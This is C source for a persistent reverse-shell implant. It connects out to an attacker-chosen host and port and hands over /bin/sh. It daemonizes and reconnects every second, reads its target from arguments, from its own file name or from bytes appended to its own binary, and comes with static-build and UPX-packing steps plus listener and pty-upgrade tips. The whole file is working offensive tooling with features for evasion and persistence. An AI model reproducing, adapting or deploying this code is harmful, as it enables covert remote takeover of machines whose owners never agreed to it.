///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/*
compile:
    musl-gcc reverse_shell.c -Os -static -s -o reverse_shell
    upx-ucl -9kvf --ultra-brute reverse_shell
*/
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <netdb.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// #define DEBUG

static char *g_argv0 = NULL;
static char *g_host = NULL;
static uint16_t g_port = 0;

static void usage();
static void reverse_shell(const char *host, unsigned short port);
static int32_t extract_argv(int argc, const char *argv[]);
static int32_t extract_name(const char *filename);
static int32_t extract_file(const char *filename);

static const char shell[] = "/bin/sh";
static const char message[] = ""
                              "Successfully reversed!\n"
                              "If you want a readline function, please use nc in this way:\n"
                              "\trlwrap nc -lnvvp <port>\n"
                              "or:\n"
                              "\tsocat readline,history=/tmp/.socat exec:'nc -lnvvp <port>'\n"
                              "\n"
                              "If you want to use a bash, please run the command after reversed:\n"
                              "\t$(which python||which python3) -c 'import pty;pty.spawn(\"bash\")'\n";
static const char *prompt = message + 23;

#ifdef DEBUG
int main(int argc, const char *argv[], const char *envp[])
{
    g_argv0 = (char *)argv[0];
    printf("g_argv0 = %s\n", g_argv0);
    {
        int retCode = 0;
        printf("start extract_argv\n");
        retCode = extract_argv(argc, (const char **)argv);
        if (0 == retCode)
        {
            printf("extract_argv ok\n");
            if (NULL == g_host)
            {
                printf("g_host = (NULL), g_port = %hu\n", g_port);
            }
            else
            {
                printf("g_host = %s, g_port = %hu\n", g_host, g_port);
            }
        }
        printf("start extract_name\n");
        retCode = extract_name(argv[0]);
        if (0 == retCode)
        {
            printf("extract_name ok\n");
            if (NULL == g_host)
            {
                printf("g_host = (NULL), g_port = %hu\n", g_port);
            }
            else
            {
                printf("g_host = %s, g_port = %hu\n", g_host, g_port);
            }
        }
        printf("start extract_file\n");
        retCode = extract_file("debug");
        if (0 == retCode)
        {
            printf("extract_file ok\n");
            if (NULL == g_host)
            {
                printf("g_host = (NULL), g_port = %hu\n", g_port);
            }
            else
            {
                printf("g_host = %s, g_port = %hu\n", g_host, g_port);
            }
        }
        printf("test usage\n");
        usage();
        exit(retCode);
    }
}
#else
int main(int argc, const char *argv[], const char *envp[])
{
    g_argv0 = (char *)argv[0];
    {
        int retCode = 0;
        retCode = extract_argv(argc, (const char **)argv);
        if (0 == retCode)
        {
            goto __DAEMON__;
        }
        retCode = extract_name(argv[0]);
        if (0 == retCode)
        {
            goto __DAEMON__;
        }
        retCode = extract_file(argv[0]);
        if (0 == retCode)
        {
            goto __DAEMON__;
        }
        fprintf(stderr, "cannot get reverse destination!\n");
        usage();
        exit(retCode);
    }
__DAEMON__:
{
    int ret = daemon(1, 1);
    if (ret < 0)
    {
        fprintf(stderr, "Cannot enter daemon mode!\n");
        goto __LOOP__;
    }
    while (1)
    {
        pid_t pid = fork();
        if (pid < 0)
        {
            fprintf(stderr, "Cannot fork!\n");
            // exit(EXIT_FAILURE);
            goto __LOOP__;
        }
        else if (pid > 0)
        {
            // parent process
            int status;
            waitpid(pid, &status, 0);
        }
        else
        {
            // child process
            reverse_shell(g_host, g_port);
            exit(EXIT_FAILURE); // exec never returns
        }
        sleep(1);
    }
    return 0;
}
__LOOP__:
{
    while (1)
    {
        reverse_shell(g_host, g_port);
        sleep(1);
    }
    return 0;
}
}

#endif

void reverse_shell(const char *host, unsigned short port)
{
    int sock;
    struct sockaddr_in server;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
        fprintf(stderr, "Cannot make socket!");
        exit(sock);
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(host);

    int ret = connect(sock, (struct sockaddr *)&server, sizeof(struct sockaddr));
    if (ret < 0)
    {
        fprintf(stderr, "Cannot connect to %s:%d!\n", host, port);
        exit(ret);
    }

    send(sock, message, sizeof(message), 0);
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    execl(shell, shell, NULL);
    close(sock);
}

void usage()
{
    fprintf(stdout, "Usage: %s <reverse_host> <port>\n\n", g_argv0);
    fprintf(stdout, prompt);
    fflush(stdout);
    exit(-1);
}

static int32_t extract_argv(int argc, const char *argv[])
{
    if (argc < 3)
    {
        return ENAVAIL;
    }
    g_host = (char *)argv[1];
    g_port = (uint16_t)strtol(argv[2], NULL, 10);
    return 0;
}

static int32_t extract_name(const char *filename)
{
    int32_t retCode = 0;
    const size_t filename_length = strlen(filename);
    ssize_t hyphens[2] = {-1, -1};
    size_t k = 0;
    for (size_t i = 0; i < filename_length; i++)
    {
        size_t j = filename_length - 1 - i;
        if (filename[j] == '-')
        {
            hyphens[k] = j;
            k++;
            if (k == 2)
            {
                break;
            }
        }
    }
    if (hyphens[0] < 0 || hyphens[1] < 0)
    {
        retCode = EINVAL;
        goto __ERROR__;
    }
    size_t host_length = ((hyphens[0] - hyphens[1] + 1) / 8 + 1) * 8;
    // if (NULL != g_host)
    // {
    //     free(g_host);
    //     g_host = NULL;
    // }
    g_host = calloc(host_length, 1);
    if (NULL == g_host)
    {
        retCode = ENOMEM;
        goto __ERROR__;
    }
    memcpy(g_host, filename + hyphens[1] + 1, hyphens[0] - hyphens[1] - 1);
    g_port = (uint16_t)strtol(filename + hyphens[0] + 1, NULL, 10);

    goto __FREE__;
__ERROR__:
    // if (NULL != g_host && g_host != argv[1])
    // {
    //     free(g_host);
    //     g_host = NULL;
    // }
__FREE__:
    return retCode;
}

static int32_t extract_file(const char *filename)
{
    int32_t retCode = 0;
    FILE *fp = NULL;
    uint8_t *buffer = NULL;

    fp = fopen(filename, "rb");
    if (NULL == fp)
    {
        retCode = EBADF;
        goto __ERROR__;
    }
    fseek(fp, 0, SEEK_END);
    long fs = ftell(fp);
    buffer = calloc(fs, 1);
    if (NULL == buffer)
    {
        retCode = ENOMEM;
        goto __ERROR__;
    }
    fseek(fp, 0, SEEK_SET);
    fread(buffer, fs, 1, fp);
    ssize_t start = -1, split = -1;
    for (size_t i = 0; i < fs; i++)
    {
        size_t j = fs - 1 - i;
        uint8_t c = buffer[j];
        if (c >= '0' && c <= '9')
        {
            continue;
        }
        if (c >= 'a' && c <= 'z')
        {
            continue;
        }
        if (c >= 'A' && c <= 'Z')
        {
            continue;
        }
        if (c == '.' || c == '%' || c == '\n')
        {
            // using echo command will be '\n' at last.
            continue;
        }
        if (c == ':' && split < 0)
        {
            split = j;
            continue;
        }
        start = j + 1;
        break;
    }
    if (split < 0 || start < 0 || split <= start)
    {
        retCode = EBADF;
        goto __ERROR__;
    }
    size_t host_length = ((split - start + 1) / 8 + 1) * 8;
    // if (NULL != g_host)
    // {
    //     free(g_host);
    //     g_host = NULL;
    // }
    g_host = calloc(host_length, 1);
    if (NULL == g_host)
    {
        retCode = ENOMEM;
        goto __ERROR__;
    }
    memcpy(g_host, buffer + start, split - start);
    g_port = (uint16_t)strtol(buffer + split + 1, NULL, 10);

    goto __FREE__;
__ERROR__:
    // if (NULL != g_host)
    // {
    //     free(g_host);
    //     g_host = NULL;
    // }
__FREE__:
    if (NULL != buffer)
    {
        free(buffer);
    }
    if (NULL != fp)
    {
        fclose(fp);
    }
    return retCode;
}
